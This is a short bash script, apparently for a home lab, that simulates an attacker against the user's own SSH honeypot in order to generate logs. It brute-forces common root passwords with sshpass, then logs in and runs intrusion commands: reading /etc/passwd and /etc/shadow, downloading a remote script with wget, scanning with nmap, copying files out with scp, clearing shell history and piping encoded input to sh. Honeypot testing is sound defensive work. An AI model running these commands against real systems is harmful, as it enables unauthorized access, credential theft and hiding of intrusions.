#!/bin/bash
# Run on the ATTACKER VM against YOUR OWN honeypot only.
# usage: ./attack_from_kali.sh <honeypot-ip> [ssh-port, default 2222]
H=${1:?honeypot ip}; P=${2:-2222}
O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $P"
command -v sshpass >/dev/null || { echo "sudo apt install -y sshpass"; exit 1; }
for pw in 123456 admin password toor qwerty 111111; do sshpass -p "$pw" ssh $O root@$H exit 2>/dev/null; done   # failed logins
sshpass -p root ssh $O root@$H 'uname -a; whoami; cat /etc/passwd; cat /etc/shadow; wget http://example.com/x.sh; chmod +x x.sh; nmap -sV 10.0.0.1; scp a b@h:/tmp; history -c; echo aGk= | sh; exit'
